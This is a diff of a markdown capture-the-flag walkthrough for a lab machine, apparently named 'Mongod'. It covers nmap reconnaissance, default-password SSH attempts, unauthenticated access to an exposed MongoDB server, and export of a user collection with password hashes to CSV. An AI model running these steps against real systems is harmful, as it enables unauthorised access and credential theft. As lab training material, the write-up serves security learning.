@@ -1,6 +1,8 @@
-Use ping to check if the host is up.
+# Mongod
 
-```shell
+Use *ping* to check if the host is up.
+
+```console
 kali@kali:~$ ping 10.129.228.30 -c 1             
 PING 10.129.228.30 (10.129.228.30) 56(84) bytes of data.
 64 bytes from 10.129.228.30: icmp_seq=1 ttl=63 time=16.0 ms
@@ -10,9 +12,9 @@ PING 10.129.228.30 (10.129.228.30) 56(84) bytes of data.
 rtt min/avg/max/mdev = 15.974/15.974/15.974/0.000 ms
 ```
 
-Run a nmap scan on the top 1000 ports.
+Run a *nmap* scan on the top 1000 ports.
 
-```shell
+```console
 kali@kali:~$ nmap -A 10.129.228.30       
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-19 00:27 EST
 Nmap scan report for 10.129.228.30
@@ -30,9 +32,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds
 ```
 
-Run a concurrent nmap scan on all ports.
+Run a concurrent *nmap* scan on all ports.
 
-```shell
+```console
 kali@kali:~$ nmap -A 10.129.228.30 -p- -T4
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-18 22:54 EST
 Nmap scan report for 10.129.228.30
@@ -73,18 +75,18 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Attempt to connect via SSH as root:'' or root:root.
 
-```shell
+```console
 kali@kali:~$ ssh root@10.129.228.30
 root@10.129.228.30's password: 
 Permission denied, please try again.
 root@10.129.228.30's password:
 ```
 
-Follow the steps [here](https://gainsec.com/2022/01/28/mongodb-cli-client-kali-linux/) to install the MongoSH CLI client.
+Follow the steps [here](https://gainsec.com/2022/01/28/mongodb-cli-client-kali-linux/) to install MongoDB tools, including the *mongosh* client.
 
-Use mongosh to connect to the MongoDB server and obtain the flag.
+Use *mongosh* to connect to the MongoDB server and obtain the **flag**.
 
-```shell
+```console
 kali@kali:~/Mongod$ mongosh "mongodb://10.129.228.30:27017"                                                                                  
 Current Mongosh Log ID: 63f2eb56c6db0ab35f06f326
 Connecting to:          mongodb://10.129.228.30:27017/?directConnection=true&appName=mongosh+1.7.1
@@ -126,7 +128,7 @@ sensitive_information>
 
 Check for other useful or interesting information on the server. We find a list of credentials for an ecommerce application.
 
-```shell
+```console
 sensitive_information> use users
 switched to db users
 users> show collections
@@ -296,22 +298,22 @@ users> db.ecommerceWebapp.find()
 ]
 ```
 
-Make a new directory "Mongod" and set it as the present working directory.
+Create a new directory, "Mongod", and set it as the present working directory.
 
-```shell
-kali@kali:~$ mkdir Mongod                                                                                                                                                                                                                                                                                                               
-kali@kali:~$ cd Mongod                                                                                                                                                                                                             
+```console
+kali@kali:~$ mkdir Mongod                                                                                                                                                                                                                                                                                                         
+kali@kali:~$ cd Mongod                                                                                                                                                                                                          
 ```
 
-Use the mongoexport CLI tool to grab all of the user data from the ecommerceWebapp collection as a CSV formatted file.
+Use the *mongoexport* to grab all of the user data from the ecommerceWebapp collection as a CSV formatted file.
 
-```shell                                                                                                                                                                                                                     
+```console                                                                                                                                                                                                                     
 kali@kali:~/Mongod$ mongoexport --host 10.129.228.30 --port 27017 --db=users --collection=ecommerceWebapp --fields "username,email,password" --type=csv --out=users.csv
 2023-02-19T22:26:43.776-0500    connected to: mongodb://10.129.228.30:27017/
 2023-02-19T22:26:44.049-0500    exported 25 records
 ```
 
-```shell
+```console
 kali@kali:~/Mongod$ ls
 users.csv                                                                                                                                                                                                                          
 kali@kali:~/Mongod$ cat users.csv                
@@ -343,5 +345,5 @@ madison.hermiston,grant.mariano@example.com,b79417a62e0e2391483f869e33fbbcc8
 clare08,fhickle@example.net,12d70565b1645ae77a607bacaf42bd03
 ```
 
-From a cursory glance, it appears that there are two types of hashes being used for the passwords and that the longer of the two types
+It appears that there are two types of hashes being used for the passwords and that the longer of the two types
 belong to potential administrators. We can return at a later time to explore further use of this information.
